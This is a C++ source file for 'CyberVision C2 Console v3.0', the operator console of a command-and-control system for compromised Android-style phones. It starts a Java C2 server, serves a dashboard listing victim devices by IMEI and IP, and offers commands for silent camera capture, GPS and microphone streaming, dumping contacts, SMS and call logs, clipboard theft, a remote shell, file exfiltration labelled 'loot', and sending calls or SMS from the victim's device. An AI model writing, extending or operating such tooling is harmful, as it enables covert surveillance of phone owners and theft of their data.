/**
 * CyberVision C2 Console (C++)
 * ─────────────────────────────
 * Lightweight CLI that spawns the Java C2 engine as a subprocess
 * and communicates via JSON lines over stdin/stdout pipes.
 * 
 * Also runs a built-in HTTP server for the Web Dashboard.
 * 
 * Build: g++ -std=c++17 -pthread -o cybervision main.cpp
 */

#include <iostream>
#include <string>
#include <thread>
#include <mutex>
#include <vector>
#include <map>
#include <sstream>
#include <fstream>
#include <cstdio>
#include <cstring>
#include <csignal>
#include <atomic>
#include <chrono>
#include <algorithm>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

// ─── ANSI Colors ─────────────────────────────────────────────────────────────
#define RST   "\033[0m"
#define BOLD  "\033[1m"
#define DIM   "\033[2m"
#define BLUE  "\033[38;5;75m"
#define GREEN "\033[38;5;78m"
#define YELLOW "\033[38;5;220m"
#define RED   "\033[38;5;203m"
#define CYAN  "\033[38;5;87m"
#define GRAY  "\033[38;5;245m"

// ─── Globals ─────────────────────────────────────────────────────────────────
static FILE* java_stdin  = nullptr;
static FILE* java_stdout = nullptr;
static pid_t java_pid    = -1;
static std::atomic<bool> running{true};
static std::mutex output_mtx;
static int web_port = 8080;

struct ClientInfo {
    std::string imei;
    std::string model;
    std::string ip;
    std::string os;
    std::string battery;
};
static std::vector<ClientInfo> clients;
static std::mutex clients_mtx;

// ─── Simple JSON extraction ──────────────────────────────────────────────────
std::string jsonGet(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":\"";
    auto pos = json.find(search);
    if (pos == std::string::npos) return "";
    auto start = pos + search.length();
    auto end = json.find("\"", start);
    if (end == std::string::npos) return "";
    return json.substr(start, end - start);
}

// ─── Send command to Java engine ─────────────────────────────────────────────
void sendToJava(const std::string& cmd, const std::string& imei = "", const std::string& args = "") {
    if (!java_stdin) return;
    std::string json = "{\"cmd\":\"" + cmd + "\",\"imei\":\"" + imei + "\",\"args\":\"" + args + "\"}\n";
    fputs(json.c_str(), java_stdin);
    fflush(java_stdin);
}

// ─── Print helpers ───────────────────────────────────────────────────────────
void printPrompt() {
    std::cout << BLUE << "cybervision" << RST << "> " << std::flush;
}

void printEvent(const std::string& type, const std::string& data) {
    std::lock_guard<std::mutex> lock(output_mtx);
    std::cout << "\r";  // Clear current line
    
    if (type == "CLIENT_CONNECTED") {
        // Parse: imei|model|ip
        auto p1 = data.find("|");
        auto p2 = data.find("|", p1+1);
        std::string imei  = data.substr(0, p1);
        std::string model = (p1 != std::string::npos && p2 != std::string::npos) ? data.substr(p1+1, p2-p1-1) : "?";
        std::string ip    = (p2 != std::string::npos) ? data.substr(p2+1) : "?";
        std::cout << GREEN << "  [+] " << RST << "Client connected: " << BOLD << imei << RST 
                  << " (" << model << " @ " << ip << ")" << std::endl;
    } else if (type == "CLIENT_DISCONNECTED") {
        std::cout << RED << "  [-] " << RST << "Client disconnected: " << data << std::endl;
    } else if (type == "LOOT") {
        auto p1 = data.find("|");
        auto p2 = data.find("|", p1+1);
        std::string imei = data.substr(0, p1);
        std::string file = (p1 != std::string::npos && p2 != std::string::npos) ? data.substr(p1+1, p2-p1-1) : data;
        std::string size = (p2 != std::string::npos) ? data.substr(p2+1) : "?";
        std::cout << YELLOW << "  [LOOT] " << RST << imei << " → " << file << " (" << size << "B)" << std::endl;
    } else if (type == "CMD_SENT") {
        std::cout << CYAN << "  [→] " << RST << data << std::endl;
    } else if (type == "CLIENT_LOG") {
        auto p = data.find("|");
        std::string imei = data.substr(0, p);
        std::string msg  = (p != std::string::npos) ? data.substr(p+1) : data;
        std::cout << GRAY << "  [" << imei << "] " << msg << RST << std::endl;
    } else if (type == "ERROR") {
        std::cout << RED << "  [!] " << RST << data << std::endl;
    } else if (type == "SERVER_STARTED") {
        std::cout << GREEN << "  [*] " << RST << "Java C2 Engine: " << data << std::endl;
    } else if (type == "CLIENT_LIST") {
        // Parse client list JSON array
        // Simple parse for display
        std::cout << GRAY << "  " << data << RST << std::endl;
    }
    
    printPrompt();
}

// ─── Java stdout reader thread ───────────────────────────────────────────────
void javaReaderThread() {
    char buf[4096];
    while (running && java_stdout) {
        if (fgets(buf, sizeof(buf), java_stdout)) {
            std::string line(buf);
            // Remove trailing newline
            while (!line.empty() && (line.back() == '\n' || line.back() == '\r'))
                line.pop_back();
            
            std::string type = jsonGet(line, "type");
            std::string data = jsonGet(line, "data");
            
            if (!type.empty()) {
                printEvent(type, data);
            }
        } else {
            break;
        }
    }
}

// ─── Web Dashboard HTTP Server ───────────────────────────────────────────────
void webServerThread() {
    int srv_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (srv_fd < 0) return;
    
    int opt = 1;
    setsockopt(srv_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(web_port);
    
    if (bind(srv_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        std::cerr << "  [!] Web dashboard port " << web_port << " in use." << std::endl;
        close(srv_fd);
        return;
    }
    listen(srv_fd, 10);
    
    while (running) {
        struct sockaddr_in client_addr{};
        socklen_t client_len = sizeof(client_addr);
        int client_fd = accept(srv_fd, (struct sockaddr*)&client_addr, &client_len);
        if (client_fd < 0) continue;
        
        // Read HTTP request (simplified)
        char req_buf[2048] = {};
        read(client_fd, req_buf, sizeof(req_buf) - 1);
        std::string request(req_buf);
        
        std::string response;
        
        if (request.find("GET /api/clients") != std::string::npos) {
            // Return JSON client list
            std::lock_guard<std::mutex> lock(clients_mtx);
            std::string json = "{\"clients\":[";
            for (size_t i = 0; i < clients.size(); i++) {
                if (i > 0) json += ",";
                json += "{\"imei\":\"" + clients[i].imei + "\",\"model\":\"" + clients[i].model +
                        "\",\"ip\":\"" + clients[i].ip + "\"}";
            }
            json += "],\"web_port\":" + std::to_string(web_port) + "}";
            response = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nAccess-Control-Allow-Origin: *\r\nContent-Length: " 
                     + std::to_string(json.size()) + "\r\n\r\n" + json;
        } else if (request.find("GET / ") != std::string::npos || request.find("GET /dashboard") != std::string::npos) {
            // Serve dashboard HTML
            std::ifstream f("web/dashboard.html");
            if (f.is_open()) {
                std::string html((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
                response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: " 
                         + std::to_string(html.size()) + "\r\n\r\n" + html;
            } else {
                std::string body = "<h1>CyberVision C2</h1><p>Dashboard file not found. Place dashboard.html in web/ directory.</p>";
                response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: " 
                         + std::to_string(body.size()) + "\r\n\r\n" + body;
            }
        } else {
            std::string body = "Not Found";
            response = "HTTP/1.1 404 Not Found\r\nContent-Length: " + std::to_string(body.size()) + "\r\n\r\n" + body;
        }
        
        write(client_fd, response.c_str(), response.size());
        close(client_fd);
    }
    close(srv_fd);
}

// ─── Spawn Java C2 Engine ────────────────────────────────────────────────────
bool spawnJavaEngine(int c2_port) {
    std::string cmd = "java -cp tools/classes cybervision.server.C2Server -p " + std::to_string(c2_port) +
                      " --log-dir logs --loot-dir loot";
    
    // Use popen2 equivalent
    int pipe_in[2], pipe_out[2];
    if (pipe(pipe_in) < 0 || pipe(pipe_out) < 0) return false;
    
    java_pid = fork();
    if (java_pid < 0) return false;
    
    if (java_pid == 0) {
        // Child: Java engine
        close(pipe_in[1]);
        close(pipe_out[0]);
        dup2(pipe_in[0], STDIN_FILENO);
        dup2(pipe_out[1], STDOUT_FILENO);
        close(pipe_in[0]);
        close(pipe_out[1]);
        
        execlp("java", "java", "-cp", "tools/classes", 
               "cybervision.server.C2Server", 
               "-p", std::to_string(c2_port).c_str(),
               "--log-dir", "logs",
               "--loot-dir", "loot",
               nullptr);
        _exit(1);
    }
    
    // Parent: C++ console
    close(pipe_in[0]);
    close(pipe_out[1]);
    java_stdin  = fdopen(pipe_in[1], "w");
    java_stdout = fdopen(pipe_out[0], "r");
    return (java_stdin && java_stdout);
}

// ─── Print banner ────────────────────────────────────────────────────────────
void printBanner(int c2_port) {
    std::cout << "\n";
    std::cout << BLUE << "  ╔══════════════════════════════════════════════════════════╗" << RST << "\n";
    std::cout << BLUE << "  ║" << RST << BOLD << "         CyberVision C2 Console v3.0                    " << RST << BLUE << "║" << RST << "\n";
    std::cout << BLUE << "  ║" << RST << "  C2 Port  : " << GREEN << c2_port << RST << "                                        " << BLUE << "║" << RST << "\n";
    std::cout << BLUE << "  ║" << RST << "  Web      : " << GREEN << "http://localhost:" << web_port << "/" << RST << "                    " << BLUE << "║" << RST << "\n";
    std::cout << BLUE << "  ║" << RST << "  Engine   : Java (protocol + handlers)                 " << BLUE << "║" << RST << "\n";
    std::cout << BLUE << "  ║" << RST << "  Console  : C++ (CLI + Web Dashboard)                  " << BLUE << "║" << RST << "\n";
    std::cout << BLUE << "  ║" << RST << "  Type " << BOLD << "'help'" << RST << " for commands                            " << BLUE << "║" << RST << "\n";
    std::cout << BLUE << "  ╚══════════════════════════════════════════════════════════╝" << RST << "\n\n";
}

// ─── Print help ──────────────────────────────────────────────────────────────
void printHelp() {
    std::cout << "\n";
    std::cout << BLUE << "  ╭──────────────────────── COMMANDS ────────────────────────╮" << RST << "\n";
    std::cout << BLUE << "  │" << RST << " " << BOLD << "GENERAL" << RST << "                                                  " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   list                 Show connected devices           " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   use <id> [action]    Interact with device             " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   exit                 Shutdown & save logs             " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "                                                        " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << " " << BOLD << "DEVICE ACTIONS (use <id> <action>)" << RST << "                      " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   info / advinfo       Device information              " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   photo                Silent camera capture            " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   gps / gps_stop       GPS location stream             " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   mic / mic_stop       Microphone stream               " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   contacts             Dump contacts                   " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   sms / sms_monitor    SMS dump / live monitor         " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   call_log             Call history                    " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   clipboard            Get clipboard content           " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   shell <cmd>          Execute shell command           " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   dir <path>           List directory                  " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   download <path>      Download file                   " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   put <local> <remote> Upload file to device           " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   toast <msg>          Show message on screen          " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   vibrate <ms>         Vibrate device                  " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   call <number>        Make phone call                 " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   send_sms <num> <msg> Send SMS                        " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  │" << RST << "   url <link>           Open URL in browser             " << BLUE << "│" << RST << "\n";
    std::cout << BLUE << "  ╰────────────────────────────────────────────────────────╯" << RST << "\n\n";
}

// ─── List clients ────────────────────────────────────────────────────────────
void listClients() {
    sendToJava("list");
}

// ─── Main CLI loop ───────────────────────────────────────────────────────────
void cliLoop() {
    std::string line;
    while (running) {
        printPrompt();
        if (!std::getline(std::cin, line)) break;
        
        // Trim
        line.erase(0, line.find_first_not_of(" \t"));
        line.erase(line.find_last_not_of(" \t") + 1);
        if (line.empty()) continue;

        // Parse: cmd [arg1] [arg2...]
        std::istringstream iss(line);
        std::string cmd, arg1, rest;
        iss >> cmd;
        iss >> arg1;
        std::getline(iss, rest);
        if (!rest.empty() && rest[0] == ' ') rest = rest.substr(1);

        // Lowercase command
        std::transform(cmd.begin(), cmd.end(), cmd.begin(), ::tolower);

        if (cmd == "help" || cmd == "?") {
            printHelp();
        } else if (cmd == "exit" || cmd == "quit") {
            sendToJava("shutdown");
            running = false;
        } else if (cmd == "list" || cmd == "ls" || cmd == "sessions") {
            listClients();
        } else if (cmd == "use" || cmd == "interact") {
            if (arg1.empty()) {
                std::cout << RED << "  [!] Usage: use <device_id> [action] [args]" << RST << std::endl;
                continue;
            }
            if (rest.empty()) {
                // Interactive mode - show menu
                std::cout << "\n" << BLUE << "  Select action for device " << BOLD << arg1 << RST << ":\n";
                std::cout << GRAY;
                std::cout << "    1. info          7. sms           13. download\n";
                std::cout << "    2. advinfo       8. sms_monitor   14. toast\n";
                std::cout << "    3. photo         9. call_log      15. vibrate\n";
                std::cout << "    4. gps          10. clipboard     16. call\n";
                std::cout << "    5. mic          11. shell         17. send_sms\n";
                std::cout << "    6. contacts     12. dir           18. url\n";
                std::cout << RST;
                std::cout << "\n  " << BLUE << "Action" << RST << ": " << std::flush;
                
                std::string action;
                std::getline(std::cin, action);
                action.erase(0, action.find_first_not_of(" \t"));
                action.erase(action.find_last_not_of(" \t") + 1);
                
                // Map numbers to names
                std::map<std::string, std::string> numMap = {
                    {"1","info"},{"2","advinfo"},{"3","photo"},{"4","gps"},{"5","mic"},
                    {"6","contacts"},{"7","sms"},{"8","sms_monitor"},{"9","call_log"},
                    {"10","clipboard"},{"11","shell"},{"12","dir"},{"13","download"},
                    {"14","toast"},{"15","vibrate"},{"16","call"},{"17","send_sms"},{"18","url"}
                };
                if (numMap.count(action)) action = numMap[action];
                
                if (action.empty() || action == "back") continue;

                // Prompt for args if needed
                std::string args;
                if (action == "toast" || action == "shell" || action == "dir" || 
                    action == "download" || action == "url" || action == "call") {
                    std::cout << "  " << BLUE << "Argument" << RST << ": " << std::flush;
                    std::getline(std::cin, args);
                } else if (action == "send_sms") {
                    std::string num, msg;
                    std::cout << "  " << BLUE << "Phone number" << RST << ": " << std::flush;
                    std::getline(std::cin, num);
                    std::cout << "  " << BLUE << "Message" << RST << ": " << std::flush;
                    std::getline(std::cin, msg);
                    args = num + ";" + msg;
                } else if (action == "vibrate") {
                    std::cout << "  " << BLUE << "Duration (ms)" << RST << " [2000]: " << std::flush;
                    std::getline(std::cin, args);
                    if (args.empty()) args = "2000";
                }

                sendToJava(action, arg1, args);
            } else {
                // Direct mode: use <id> <action> [args]
                sendToJava(rest.empty() ? arg1 : arg1, arg1, rest);
                // Fix: arg1 is the device id, rest starts with action
                std::istringstream rest_iss(rest);
                std::string action, action_args;
                rest_iss >> action;
                std::getline(rest_iss, action_args);
                if (!action_args.empty() && action_args[0] == ' ') action_args = action_args.substr(1);
                
                // Actually: cmd=use, arg1=device_id, rest=action [args]
                // We need to send: cmd=action, imei=arg1, args=action_args
                sendToJava(action.empty() ? "info" : action, arg1, action_args);
            }
        } else {
            std::cout << RED << "  [!] Unknown command: '" << cmd << "'. Type 'help'." << RST << std::endl;
        }
    }
}

// ─── Signal handler ──────────────────────────────────────────────────────────
void signalHandler(int sig) {
    running = false;
    sendToJava("shutdown");
    std::cout << "\n  [*] Shutting down..." << std::endl;
    if (java_pid > 0) kill(java_pid, SIGTERM);
    exit(0);
}

// ─── Main ────────────────────────────────────────────────────────────────────
int main(int argc, char* argv[]) {
    int c2_port = 9999;
    
    // Parse args
    for (int i = 1; i < argc; i++) {
        if (std::string(argv[i]) == "-p" && i + 1 < argc) c2_port = std::atoi(argv[++i]);
        if (std::string(argv[i]) == "-w" && i + 1 < argc) web_port = std::atoi(argv[++i]);
        if (std::string(argv[i]) == "--help") {
            std::cout << "Usage: cybervision [-p c2_port] [-w web_port]\n";
            return 0;
        }
    }
    
    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);
    
    printBanner(c2_port);
    
    // Start web dashboard
    std::cout << GREEN << "  [*] " << RST << "Web Dashboard → http://localhost:" << web_port << "/" << std::endl;
    std::thread webThread(webServerThread);
    webThread.detach();
    
    // Spawn Java engine
    std::cout << GREEN << "  [*] " << RST << "Starting Java C2 Engine on port " << c2_port << "..." << std::endl;
    if (!spawnJavaEngine(c2_port)) {
        std::cerr << RED << "  [!] Failed to start Java engine. Make sure Java is installed and tools/classes exists." << RST << std::endl;
        std::cerr << "      Run: ./build.sh" << std::endl;
        return 1;
    }
    
    // Start Java reader thread
    std::thread readerThread(javaReaderThread);
    readerThread.detach();
    
    // Give Java engine time to start
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
    
    // CLI loop
    cliLoop();
    
    // Cleanup
    if (java_pid > 0) kill(java_pid, SIGTERM);
    return 0;
}
